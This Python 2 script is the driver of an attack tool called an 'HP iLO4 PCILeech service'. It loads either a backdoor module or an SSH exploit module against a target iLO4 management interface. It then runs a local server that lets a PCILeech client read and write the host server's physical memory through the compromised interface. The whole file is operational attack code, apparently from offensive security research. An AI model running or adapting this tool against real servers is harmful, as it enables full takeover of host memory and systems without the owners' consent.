#!/usr/bin/python

import argparse
import socket
import sys
from struct import pack,unpack_from

from mod_backdoor import *
from mod_ssh_exploit import *

STATUS = 0
MEM_READ = 1
MEM_WRITE = 2

mods = {"backdoor": ModBackdoor, "ssh_exploit": ModSSHExploit}

parser = argparse.ArgumentParser(description="HP iLO4 PCILeech service")
parser.add_argument('remote_addr', help="IP address of the target iLO4 interface")
parser.add_argument('-m', '--module', type=str, default='backdoor', help="Module to use (%s)" % ", ".join(mods.keys()))
parser.add_argument('-u', '--user', type=str, default='', help="user name")
parser.add_argument('-p', '--password', type=str, default='', help="SSH password")
parser.add_argument('-P', '--port', type=int, default=22, help="SSH port")
parser.add_argument('-v', '--verbose', action='store_true', help="verbosity")

args = parser.parse_args()

if args.module in mods:
	try:
		mod = mods[args.module](args)
	except Exception as e:
		print "Error: %s" % e
		sys.exit(1)
else:
	print "Bad module specified"
	sys.exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_address = ('127.0.0.1', 8888)
if args.verbose:
	print 'starting up on %s port %s' % server_address

sock.bind(server_address)
sock.listen(1)

def send_response(sock, cmd_id, addr, data):
	buf  = pack("<3Q", cmd_id, addr, len(data))
	buf += data
	sock.send(buf)

def handle(sock, data):
	cmd_id, ptr, sz = unpack_from("<3Q", data)
	if args.verbose:
		print "[*] CMD: %x, PTR: %x, SZ: %x" % (cmd_id, ptr, sz)

	if cmd_id == STATUS:
		status = mod.status()
		send_response(sock, cmd_id, 0, chr(status))
	elif cmd_id == MEM_READ:
		try:
			output = mod.dump_memory(ptr, sz)
		except Exception as e:
			print "Exception:",e
			output = ""
		send_response(sock, cmd_id, ptr, output)
	elif cmd_id == MEM_WRITE:
		payload = sock.recv(sz)
		mod.write_memory(ptr, payload)
		send_response(sock, cmd_id, ptr, "")


while True:
    connection, client_address = sock.accept()
    try:
		if not mod.start():
			raise Exception("Fail starting module")
		while True:
		    data = connection.recv(24)
		    if data:
		        handle(connection,data)
		    else:
		        break
    except Exception as e:
    	print "Exception:",e
    connection.close()
    mod.stop()